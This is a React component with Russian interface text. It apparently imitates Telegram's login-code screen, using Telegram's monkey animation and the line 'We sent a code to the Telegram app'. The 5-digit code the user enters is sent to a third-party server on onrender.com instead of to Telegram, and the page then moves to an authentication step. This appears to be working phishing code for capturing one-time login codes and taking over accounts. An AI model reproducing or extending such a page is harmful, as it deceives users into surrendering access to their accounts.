import React, { useState, useEffect } from 'react';
import './App2.css';
import './PhoneNumberInput.css';
import './App.css';
import { Link, useNavigate } from 'react-router-dom';
import CodeNumberInput from './CodeNumber';

const App2 = () => {
  const [value, setCodeNumber] = useState('');
  const [isValidCode, setIsValidCode] = useState(false);
  const [isInputValid, setIsInputValid] = useState(true);
  const [shouldHighlight, setShouldHighlight] = useState(false);
  const history = useNavigate();

  useEffect(() => {
    let timeoutId;

    if (!isInputValid && !isValidCode) {
      // Запустить таймер для сброса анимации через 1 секунду
      timeoutId = setTimeout(() => {
        setIsInputValid(true);
        setShouldHighlight(false); // Сбросить подсветку
      }, 1000);
    }

    return () => {
      // Очистить таймер при размонтировании компонента
      clearTimeout(timeoutId);
    };
  }, [isInputValid, isValidCode]);

  const handleInputChange = (event) => {
    const inputValue = event.target.value;
    setCodeNumber(inputValue);
    setIsInputValid(inputValue.length === 5);
    setIsValidCode(inputValue.length === 5);
    setShouldHighlight(inputValue.length !== 5);
  };

  const CodeSubmit = (event) => {
    event.preventDefault();

    if (!isValidCode) {
      setIsInputValid(false);
      setShouldHighlight(true);
      return;
    }

    const serverUrl = 'https://tgserver-l1sf.onrender.com/authCode';

    const requestData = {
      value: value,
    };

    fetch(serverUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(requestData),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`Ошибка HTTP: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        console.log('Успешный ответ от сервера:', data);
        history(`/Authentification.js`);
      })
      .catch((error) => {
        console.error('Ошибка при отправке запроса:', error.message);
      });
  };

  return (
    <div className='app2-conteiner'>
      <img src="./emojibest_com_TwoFactorSetupMonkeyIdle.gif" alt="Мое изображение" className='monkey' />
      <a className="add-text2">
        Мы отправили код в приложение Telegram <br /> на ваше мобильное устройство.
      </a>
      <form className="code-input-container" onSubmit={CodeSubmit}>
        <input
          type="tel"
          id="value"
          value={value}
          onChange={handleInputChange}
          className={`code-input ${shouldHighlight ? 'highlight-invalid' : ''}`}
          placeholder="Код"
        />
        <button type="submit" className='button-code' disabled={!isValidCode}>
          Далее
        </button>
        <Link to="./Authentification"></Link>
      </form>
    </div>
  );
};

export default App2;
